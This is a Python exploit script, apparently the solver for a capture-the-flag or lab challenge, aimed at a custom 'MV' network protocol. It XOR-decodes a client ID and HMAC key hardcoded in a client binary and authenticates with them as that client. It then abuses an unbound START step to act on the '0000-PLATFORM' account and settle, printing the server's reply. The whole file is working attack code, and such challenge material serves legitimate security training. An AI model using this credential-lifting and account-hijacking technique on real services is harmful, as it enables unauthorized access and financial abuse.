#!/usr/bin/env python3
"""Recover the roaming credentials and exploit the unbound START account."""

import hashlib
import hmac
import socket
import struct
import sys


HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 31336

TYPE_HELLO = 0x01
TYPE_CHALLENGE = 0x02
TYPE_AUTH = 0x03
TYPE_START = 0x04
TYPE_SETTLE = 0x05
TYPE_RESPONSE = 0x06

TAG_CLIENT_ID = 0x01
TAG_NONCE = 0x02
TAG_HMAC = 0x03
TAG_ACCOUNT_ID = 0x04


def invert_client_config() -> tuple[bytes, bytes]:
    """Equivalent to lifting the tiny XOR decoders from the client binary."""
    encrypted_identity = bytes([0x67, 0x74, 0x77, 0x0F, 0x13, 0x12, 0x12, 0x13])
    encrypted_key = bytes([
        0x10, 0x0D, 0x03, 0x0F, 0x1D, 0x09, 0x07, 0x1B,
        0x1D, 0x11, 0x07, 0x01, 0x10, 0x07, 0x16,
    ])
    client_id = bytes(x ^ 0x22 for x in encrypted_identity)
    key = bytes(x ^ 0x42 for x in encrypted_key)
    return client_id, key


def tlv(*items: tuple[int, bytes]) -> bytes:
    return b"".join(bytes((tag, len(value))) + value for tag, value in items)


def frame(frame_type: int, payload: bytes = b"") -> bytes:
    return b"MV" + bytes((1, frame_type)) + struct.pack(">H", len(payload)) + payload


def recv_exact(sock: socket.socket, length: int) -> bytes:
    data = bytearray()
    while len(data) < length:
        chunk = sock.recv(length - len(data))
        if not chunk:
            raise ConnectionError("connection closed")
        data.extend(chunk)
    return bytes(data)


def recv_frame(sock: socket.socket) -> tuple[int, bytes]:
    header = recv_exact(sock, 6)
    if header[:3] != b"MV\x01":
        raise ValueError(f"bad header: {header.hex()}")
    length = struct.unpack(">H", header[4:6])[0]
    return header[3], recv_exact(sock, length)


def parse_tlv(payload: bytes) -> dict[int, bytes]:
    fields = {}
    pos = 0
    while pos < len(payload):
        tag, length = payload[pos], payload[pos + 1]
        fields[tag] = payload[pos + 2 : pos + 2 + length]
        pos += 2 + length
    return fields


def expect(sock: socket.socket, expected_type: int) -> bytes:
    actual_type, payload = recv_frame(sock)
    if actual_type != expected_type:
        raise RuntimeError(f"expected {expected_type:#x}, got {actual_type:#x}: {payload!r}")
    return payload


def main() -> None:
    client_id, key = invert_client_config()

    with socket.create_connection((HOST, PORT)) as sock:
        sock.sendall(frame(TYPE_HELLO, tlv((TAG_CLIENT_ID, client_id))))
        challenge = parse_tlv(expect(sock, TYPE_CHALLENGE))
        nonce = challenge[TAG_NONCE]

        mac = hmac.new(key, client_id + nonce, hashlib.sha256).digest()[:8]
        sock.sendall(frame(TYPE_AUTH, tlv((TAG_HMAC, mac))))
        expect(sock, TYPE_RESPONSE)

        sock.sendall(frame(TYPE_START, tlv((TAG_ACCOUNT_ID, b"0000-PLATFORM"))))
        expect(sock, TYPE_RESPONSE)

        sock.sendall(frame(TYPE_SETTLE))
        print(expect(sock, TYPE_RESPONSE).decode())


if __name__ == "__main__":
    main()
